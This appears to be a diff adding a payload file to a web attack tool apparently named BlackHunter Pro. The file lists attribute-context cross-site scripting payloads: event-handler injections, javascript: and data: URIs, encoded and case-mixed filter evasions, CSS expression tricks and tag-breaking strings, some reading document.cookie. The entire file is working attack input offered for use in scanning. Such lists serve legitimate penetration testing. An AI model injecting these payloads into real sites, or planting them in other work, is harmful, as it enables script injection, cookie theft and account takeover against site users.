@@ -1,0 +1,211 @@
+# payloads/xss/attribute.txt
+# Attribute-based XSS Payloads
+# BlackHunter Pro
+
+# =============================================
+# DOUBLE QUOTE CONTEXT (")
+# =============================================
+
+" onmouseover=alert(1) x="
+" onmouseover="alert(1)" x="
+" onclick=alert(1) x="
+" onclick="alert(1)" x="
+" onload=alert(1) x="
+" onload="alert(1)" x="
+" onerror=alert(1) x="
+" onerror="alert(1)" x="
+" onfocus=alert(1) autofocus x="
+" onfocus="alert(1)" autofocus x="
+" onmouseenter=alert(1) x="
+" onmouseenter="alert(1)" x="
+" onanimationstart=alert(1) style="animation:x 1s" x="
+" ontransitionend=alert(1) style="transition:x 1s" x="
+" accesskey=x onclick=alert(1) x="
+" accesskey="x" onclick="alert(1)" x="
+" tabindex=1 onfocus=alert(1) autofocus x="
+" tabindex="1" onfocus="alert(1)" autofocus x="
+" style="background:url(javascript:alert(1))" x="
+" style="background-image:url(javascript:alert(1))" x="
+" style="width:expression(alert(1))" x="
+" style="behavior:url(x.htc)" x="
+" src=x onerror=alert(1) x="
+" src="x" onerror="alert(1)" x="
+
+# =============================================
+# SINGLE QUOTE CONTEXT (')
+# =============================================
+
+' onmouseover=alert(1) x='
+' onmouseover='alert(1)' x='
+' onclick=alert(1) x='
+' onclick='alert(1)' x='
+' onload=alert(1) x='
+' onload='alert(1)' x='
+' onerror=alert(1) x='
+' onerror='alert(1)' x='
+' onfocus=alert(1) autofocus x='
+' onfocus='alert(1)' autofocus x='
+' onmouseenter=alert(1) x='
+' onmouseenter='alert(1)' x='
+' onanimationstart=alert(1) style='animation:x 1s' x='
+' ontransitionend=alert(1) style='transition:x 1s' x='
+' accesskey=x onclick=alert(1) x='
+' accesskey='x' onclick='alert(1)' x='
+' tabindex=1 onfocus=alert(1) autofocus x='
+' tabindex='1' onfocus='alert(1)' autofocus x='
+' style='background:url(javascript:alert(1))' x='
+' style='background-image:url(javascript:alert(1))' x='
+' style='width:expression(alert(1))' x='
+' style='behavior:url(x.htc)' x='
+' src=x onerror=alert(1) x='
+' src='x' onerror='alert(1)' x='
+
+# =============================================
+# UNQUOTED CONTEXT
+# =============================================
+
+onmouseover=alert(1)
+onclick=alert(1)
+onload=alert(1)
+onerror=alert(1)
+onfocus=alert(1) autofocus
+onmouseenter=alert(1)
+onanimationstart=alert(1)
+ontransitionend=alert(1)
+accesskey=x onclick=alert(1)
+tabindex=1 onfocus=alert(1) autofocus
+style=background:url(javascript:alert(1))
+style=background-image:url(javascript:alert(1))
+style=width:expression(alert(1))
+src=x onerror=alert(1)
+
+# =============================================
+# JAVASCRIPT: PROTOCOL
+# =============================================
+
+javascript:alert(1)
+javascript:alert('XSS')
+javascript:alert(document.cookie)
+javascript:prompt(1)
+javascript:confirm(1)
+javascript:alert(document.domain)
+javascript:alert(window.location)
+javascript:alert(location.href)
+javascript:alert(document.URL)
+javascript:eval('alert(1)')
+javascript:void(alert(1))
+javascript:void(0);alert(1)
+javascript:alert(String.fromCharCode(88,83,83))
+javascript:alert(/XSS/)
+javascript:alert`1`
+javascript:alert.call(null,1)
+javascript:alert.apply(null,[1])
+Javascript:alert(1)
+JAVASCRIPT:alert(1)
+JaVaScRiPt:alert(1)
+java&#115;cript:alert(1)
+java%0ascript:alert(1)
+java%09script:alert(1)
+java%0dscript:alert(1)
+javascript&colon;alert(1)
+javascript&#58;alert(1)
+javascript&#x3a;alert(1)
+
+# =============================================
+# DATA: PROTOCOL
+# =============================================
+
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+data:text/html,<img src=x onerror=alert(1)>
+data:text/html;charset=utf-8,<script>alert(1)</script>
+data:text/javascript,alert(1)
+data:application/xhtml+xml,<script>alert(1)</script>
+data:,<script>alert(1)</script>
+
+# =============================================
+# STYLE ATTRIBUTE
+# =============================================
+
+" style="background:url(javascript:alert(1))" x="
+' style='background:url(javascript:alert(1))' x='
+" style="background-image:url(javascript:alert(1))" x="
+' style='background-image:url(javascript:alert(1))' x='
+" style="width:expression(alert(1))" x="
+' style='width:expression(alert(1))' x='
+" style="behavior:url(x.htc)" x="
+' style='behavior:url(x.htc)' x='
+" style="list-style-image:url(javascript:alert(1))" x="
+' style='list-style-image:url(javascript:alert(1))' x='
+" style="background:url('javascript:alert(1)')" x="
+" style="background:url(&#106;avascript:alert(1))" x="
+" style="background:url(javascript&#58;alert(1))" x="
+
+# =============================================
+# SRCSET ATTRIBUTE
+# =============================================
+
+" srcset="x onerror=alert(1)" x="
+' srcset='x onerror=alert(1)' x='
+" srcset="x, y onerror=alert(1)" x="
+" srcset="x 1x onerror=alert(1)" x="
+" srcset="x 1x, y 2x onerror=alert(1)" x="
+
+# =============================================
+# FORM ACTION
+# =============================================
+
+" formaction="javascript:alert(1)" x="
+' formaction='javascript:alert(1)' x='
+" formaction="data:text/html,<script>alert(1)</script>" x="
+action="javascript:alert(1)"
+action='javascript:alert(1)'
+action=javascript:alert(1)
+
+# =============================================
+# HREF ATTRIBUTE
+# =============================================
+
+" href="javascript:alert(1)" x="
+' href='javascript:alert(1)' x='
+" href="data:text/html,<script>alert(1)</script>" x="
+href="javascript:alert(1)"
+href='javascript:alert(1)'
+href=javascript:alert(1)
+
+# =============================================
+# MIXED QUOTES
+# =============================================
+
+" onmouseover='alert(1)' x="
+' onmouseover="alert(1)" x='
+" onclick='alert(1)' x="
+' onclick="alert(1)" x='
+" onerror='alert(1)' x="
+' onerror="alert(1)" x='
+" onload='alert(1)' x="
+' onload="alert(1)" x='
+" autofocus onfocus='alert(1)' x="
+' autofocus onfocus="alert(1)" x='
+
+# =============================================
+# ATTRIBUTE BREAKING
+# =============================================
+
+" ><script>alert(1)</script>
+' ><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+" ><svg onload=alert(1)>
+' ><svg onload=alert(1)>
+"><iframe src=javascript:alert(1)>
+'><iframe src=javascript:alert(1)>
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" onclick="alert(1)
+' onclick='alert(1)
+" autofocus onfocus="alert(1)
+' autofocus onfocus='alert(1)
